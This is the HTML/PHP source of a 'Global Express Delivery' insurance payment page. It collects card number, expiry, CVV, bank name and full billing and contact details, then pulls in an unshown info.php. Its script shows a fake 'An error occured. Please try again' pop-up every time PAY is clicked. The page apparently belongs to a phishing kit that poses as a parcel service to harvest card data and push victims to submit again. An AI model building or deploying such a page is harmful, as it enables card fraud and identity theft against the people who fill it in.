<!doctype html>
<html lang="en">

  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" href="style.css">
    <link rel="stylesheet" type="text/css" href="responsive.css">
    <title>Global Express Delivery</title>
    <!-- favicons -->
    <link rel="apple-touch-icon" sizes="57x57" href="images/Icons/apple-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="images/Icons/apple-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="images/Icons/apple-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="images/Icons/apple-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="images/Icons/apple-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="images/Icons/apple-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="images/Icons/apple-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="images/Icons/apple-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="images/Icons/apple-icon-180x180.png">
    <link rel="icon" type="image/png" sizes="192x192"  href="images/Icons/android-icon-192x192.png">
    <link rel="icon" type="image/png" sizes="32x32" href="images/Icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="96x96" href="images/Icons/favicon-96x96.png">
    <link rel="icon" type="image/png" sizes="16x16" href="images/Icons/favicon-16x16.png">
    <link rel="manifest" href="images/Icons/manifest.json">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="images/Icons/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
  </head>
  <body>
    <!-- php link -->
    <?php include('info.php')?>
    <header id="header" class="container-fluid text-light sticky-top">
      <!-- logo -->
      <div id="logo_box">
        <img id="logo" src="images/logo.png">
      </div>
      <!-- end logo -->
      <nav id="navbar" class="navbar navbar-expand-lg navbar-toggleable-sm navbar-inverse">
        <div class="container">
          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navdiv">
            <span class="navbar-toggler-icon"></span>
          </button>
          <div id="navdiv" class="collapse navbar-collapse">
            <ul id="navul" class="navbar mr-auto list-unstyled">
              <li class="nav-item"><a class="text-light nav-link" href="index.html">HOME</a><hr></li>
              <li class="nav-item"><a class="text-light nav-link" href="services.html">SERVICES</a><hr></li>
              <li class="nav-item dropdown">
                <a class="text-light nav-link dropdown-toggle" href="" id="navbarDropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">TRACKING</a>
                <div class="dropdown-menu" aria-labelledby="navbarDropdownMenuLink">
                  <a class="dropdown-item" href="trace.php">TRACK PACKAGE</a>
                  <a class="dropdown-item" href="payment.php">PAYMENT</a>
                </div>
                <hr>
              </li>
              <li class="nav-item"><a class="text-light nav-link" href="location.html">LOCATIONS</a><hr></li>
              <li class="nav-item"><a class="text-light nav-link" href="contactus.html">CONTACT US</a><hr></li>
            </ul>
          </div>
        </div>
      </nav>
    </header>
    <!-- banner -->
    <section>
      <div id="banner3">
        <div id="banner-txt" class="text-light text-center">
          <h1>INSURANCE PAYMENT</h1>
          <hr class="the-line">
        </div>
      </div>
    </section>
    <section>
      <div class="text-center my-5 py-5">
        <div>
          <h4>For Payments with Credit/Debit Card, use the form below</h4>
          <p>For Other means of Payment Contact Us</p>
          <div id="payment-imgBx" class="mt-5 d-block">
            <img src="images/cc-sets.png" >
          </div>
        </div>
      </div>
      <!-- Payment form -->
      <div class="container">
        <div class="row justify-content-center">
          <form method="POST" id="payment" class="col-md-6">
            <div id="secure-image-box" class="row">
              <div class="mx-auto mt-3">
                <img style="width: 100%; height: 200px;" src="images/pay.png" >
              </div>
            </div>
            <div id="card-details">
              <div>
                <label class="font-weight-bold">Name Of Bank</label>
                <input class="form-control" id="bank-name" type="text" name="bank-name">
              </div>
              <div>
                <label class="font-weight-bold">Amount in USD</label>
                <input class="form-control" id="amount" type="text" name="amount" pattern="[-+]?[0-9]*[.,]?[0-9]+" required>
              </div>
              <div>
                <label class="font-weight-bold">Credit Card Type</label>
                <input class="form-control" id="cc-type" type="text" name="cc-type" list="cc-list" pattern="MASTER CARD|VISA CARD|OTHER CARDS" required>
                <datalist id="cc-list">
                  <option value="MASTER CARD">
                  <option value="VISA CARD">
                  <option value="OTHER CARDS">
                </datalist>
              </div>
              <div>
                <label class="font-weight-bold">Name on card</label>
                <input  class="form-control" id="card-name" type="text" name="card-name" pattern="[a-zA-z\s]{3,}" required>
              </div>
              <div id="card-number-field">
                <label class="font-weight-bold">Card Number</label>
                <input class="form-control" id="cardNum" type="text" name="cardNum" pattern="[0-9]{13,16}"required>
              </div>
              <div class="row d-flex mx-auto">
                <div >
                  <label class="font-weight-bold">Expiration Month & Year</label>
                  <input class="form-control" id="exp-date" placeholder="MM/YY" type="text" name="exp-date" required>
                </div>
                <div>
                  <label class="font-weight-bold">CVV Number</label>
                  <input class="form-control pr-4" id="cvv-num" type="text" name="cvv-num" pattern="[0-9]{3,4}" required>
                </div>
              </div>
            </div>
            <div id="billing-details">
              <h4 class="font-weight-bold">Billing Details</h4>
              <div>
                <label class="font-weight-bold">First Name</label>
                <input class="form-control" id="first-name" type="text" name="firstname" pattern="[a-zA-z\s]{2,}" required>
              </div>
              <div>
                <label class="font-weight-bold">Last Name</label>
                <input class="form-control" id="last-name" type="text" name="lastname" pattern="[a-zA-z\s]{2,}" required>
              </div>
              <div>
                <label class="font-weight-bold">Email Address</label>
                <input class="form-control" id="email" type="email" name="email" required>
              </div>
              <div>
                <label class="font-weight-bold">Phone Number</label>
                <input class="form-control" id="phone" placeholder="123-456-7890" type="text" name="phone" pattern="\d{3}[\-]\d{3}[\-]\d{4}" required>
              </div>
              <div>
                <label class="font-weight-bold">Street</label>
                <input class="form-control" id="street" type="text" name="street" required>
              </div>
              <div>
                <label class="font-weight-bold">City</label>
                <input class="form-control" id="city" type="text" name="city" required>
              </div>
              <div>
                <label class="font-weight-bold">State</label>
                <input class="form-control" id="state" type="text" name="state">
              </div>
              <div>
                <label class="font-weight-bold">ZIP Code</label>
                <input class="form-control" id="zip-code" type="text" name="zip" required> 
              </div>
              <div>
                <label class="font-weight-bold">Country</label>
                <input class="form-control" id="country" type="text" name="country" required>
              </div>
              <div class="row justify-content-center">
                <div id="btn-box" class="mx-auto">
                  <input id="proceed" class="btn text-light" type="submit" name="submit" value="PAY" style="background-color: #08556d">
                </div>
              </div>
            </div>
          </form>
        </div>
      </div>
    </section>
    <div id="disclaimer3">
        
    </div>
    <!-- Partners -->
        <div id="partners" class="container text-center">
          <div id="partnerImage">
            <h5>Our Partners</h5>
            <img src="partners/partners.png">
          </div>
        </div>
    </section>
    <!-- footer -->
    <footer id="footer" class="">
        <div id="contactus" class="">
          <h5>Contact Us</h5>
          <p>Phone: <span><a   href="tel:+15418961332">+1(541)896-1332</a></span></p>
          <p>Email : <span><a href="mailto:webmail@mail.com">webmail@mail.com</a></span></p>
        </div>
        <hr style="background-color: #8a0000;">
        <div id="copyright" class="">
          <p>© 2021 Global Express Delivery | All Rights Reserved.</p>
        </div>
        <!-- <button style="z-index: 100;" type="button"><a href="#header"><span id="scrollup">Scroll Up</span></a></button> -->
    </footer>
    <!-- php link -->
    <?php include('info.php')?>
    <!-- form checker -->
    <script type="text/javascript" src="formcheck.js"></script>
    <!-- Optional JavaScript-->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
    <script type="text/javascript">

      $("#proceed").click(function() {

        swal({
          title: "Sorry !",
          text: "An error occured. Please try again",
          button: "OK",
        });
      });

    </script>
  </body>
</html>